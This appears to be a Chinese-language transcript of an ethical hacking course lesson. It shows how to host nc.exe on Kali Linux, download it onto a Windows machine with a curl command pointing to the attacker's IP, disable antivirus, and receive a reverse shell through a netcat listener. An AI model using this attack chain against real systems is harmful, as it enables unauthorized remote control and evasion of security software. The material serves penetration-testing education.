

![](img/fa3ddbcf51d561958722b3449eaeda86_1.png)

🛡️ Udemy - 完整道德黑客课程2026：38：通过 curl 访问 Windows

在本节课中我们将要学习如何使用 curl 工具从 Kali Linux 访问 Windows 电脑。这是一节比较实操的课程，我们会一步步演示在 Linux 端准备文件，再在 Windows 端执行下载，最后建立远程连接。虽然听起来有点复杂，但只要跟着步骤走，初学者也能看懂每一行命令的作用，不需要预先具备很深的网络基础。



![](img/fa3ddbcf51d561958722b3449eaeda86_3.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_4.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_6.png)

首先，我们要确保自己的 Kali Linux 环境已经准备好，并且知道自己的本地 IP 地址。打开 Firefox 浏览器，搜索微软官方提供的 curl 工具。curl 是一个用来在命令行中传输数据的工具，微软自带的版本由微软本身维护，功能和 Linux 版本略有不同，属于独立的构建版本。查看一下官方文档就能明白基本用法，了解它能做什么。

![](img/fa3ddbcf51d561958722b3449eaeda86_8.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_10.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_11.png)

接着打开 Kali Linux 的 root 终端。我们需要知道本机的 IP 地址，因为后面 Windows 要连接到这台机器，需要知道往哪里发数据。输入 ifconfig 命令，可以看到类似 192.168.0.19 这样的地址，这就是你的本地局域网 IP 地址，通常显示在 wlan0 网卡下面。把这个地址记下来，一会儿 Windows 端下载文件时要用到。



![](img/fa3ddbcf51d561958722b3449eaeda86_13.png)

上一节我们介绍了如何获取 IP 地址，本节中我们来看看如何在 Linux 端准备好攻击载荷并启动服务。在这个实验里，我们会用到一个名为 nc.exe 的文件，这是 netcat 工具的 Windows 版本，Kali Linux 通常已经内置了相关工具。我们不需要自己编译，直接使用即可，把它当成一个可以在 Windows 上运行的小程序。

![](img/fa3ddbcf51d561958722b3449eaeda86_15.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_17.png)

同时，还需要启动一个网页服务器，让 Windows 能够通过 HTTP 协议下载文件。Apache 是常见的选择。如果系统提示找不到 Apache 服务，可能需要先安装或者用其他方式提供文件下载。反正核心目标就是让这台 Linux 机器能够对外提供 nc.exe 供下载，确保 Windows 能访问到。



![](img/fa3ddbcf51d561958722b3449eaeda86_19.png)

上一节我们来看看如何在 Linux 端准备好攻击载荷并启动服务，本节中我们来看看如何在 Windows 电脑上操作。

![](img/fa3ddbcf51d561958722b3449eaeda86_21.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_22.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_24.png)

以下是 Windows 端需要执行的关键步骤：

![](img/fa3ddbcf51d561958722b3449eaeda86_26.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_28.png)

- 以管理员身份运行命令提示符 CMD。
- 切换到桌面目录，输入 cd desktop。
- 执行 curl 下载命令：`curl http://192.168.0.19/nc.exe -o nc.exe`，注意把 IP 地址换成你自己的 Kali Linux 地址。

![](img/fa3ddbcf51d561958722b3449eaeda86_30.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_32.png)

接下来，转到目标 Windows 电脑。以管理员身份打开命令提示符，因为普通用户权限可能不足以执行某些网络操作。进入桌面目录，使用 curl 命令从刚才的 Linux IP 地址下载 nc.exe。执行之后，nc.exe 就会被下载到 Windows 桌面上，文件名保持不变。

此时，Windows 的杀毒软件可能会拦截这个操作。很多系统会安装第三方杀毒软件，这时候建议暂时禁用。如果只开启 Windows Defender，它可能检测不到这种行为，攻击成功率会更高。只要杀毒软件没有阻止，文件就会正常保存下来。



上一节我们来看看如何在 Windows 电脑上操作，本节中我们来看看如何在 Kali Linux 端建立监听并拿到控制权。回到 Kali Linux 终端，启动 netcat 监听，等待 Windows 端连接过来。如果一切正常，终端会显示 listening 字样，说明正在等待连接，这时候不要关闭终端。

![](img/fa3ddbcf51d561958722b3449eaeda86_34.png)

当 Windows 端运行下载好的 nc.exe 并连接回来后，Kali 终端就会弹出一个命令提示符。这时候你就可以输入 help 或者 --help 查看可用的命令，进一步操作目标系统。你会看到类似 C:\Users\system\desktop 的路径，这说明你已经进入了对方的电脑，拥有了命令行执行权限。

以下是结束攻击时常用的操作：

- 输入 help 查看支持的命令列表。
- 输入 --help 显示详细帮助信息。
- 按下 Ctrl+C 中断当前连接。

![](img/fa3ddbcf51d561958722b3449eaeda86_36.png)

最后，可以检查一下下载的 exe 文件属性，有些杀毒软件会将其标记为潜在的不需要程序，也就是 PUP。如果没有杀毒软件拦截，就能拿到完整的远程访问权限。用 Ctrl+C 或者输入相应退出命令可以结束会话，断开与目标机器的连接。



![](img/fa3ddbcf51d561958722b3449eaeda86_38.png)

![](img/fa3ddbcf51d561958722b3449eaeda86_39.png)

本节课中我们一起学习了如何使用 curl 工具从 Kali Linux 向 Windows 电脑传输文件，并通过 netcat 建立远程连接。整个流程包括获取本机 IP、准备载荷、在 Windows 端下载文件、处理杀毒软件拦截，以及在 Linux 端接收控制权。掌握这些步骤后，你就能理解基本的横向移动思路，记得只在授权范围内进行测试，切勿用于非法用途。

